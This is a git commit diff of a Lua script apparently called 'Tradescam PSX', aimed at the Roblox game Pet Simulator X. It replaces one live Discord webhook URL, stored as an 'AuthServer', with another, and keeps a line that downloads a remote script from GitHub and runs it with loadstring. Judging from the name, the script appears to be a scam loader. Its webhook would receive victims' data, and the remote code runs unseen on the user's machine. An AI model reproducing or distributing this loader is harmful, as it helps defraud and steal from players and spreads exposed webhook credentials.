14aa0fb47098a0686ed7874565d9f0057f819074
Hshshahshsh <110442121+Hshshahshsh@users.noreply.github.com>
2022-12-13 05:44:16 +0800

    Update Tradescam PSX.lua

--- Tradescam PSX.lua
+++ Tradescam PSX.lua
@@ -1,3 +1,3 @@
 _G.Key = "KChsjAsbskH"
-_G.AuthServer = "https://discord.com/api/webhooks/1045464333150322689/lbVqdph15sIPQDKthby4L2n_ZyyCsECEDj0CdpR_cCzsv2oGdYh46yTLIbsuA6exGqnP"
+_G.AuthServer = "https://discord.com/api/webhooks/1051977554245980180/I_lxw8Y1hduvaRo5T39TYickDbU2XK19LVyn8CKJz-cMzxSVipyQfdc8IzXbqeftCbFQ"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
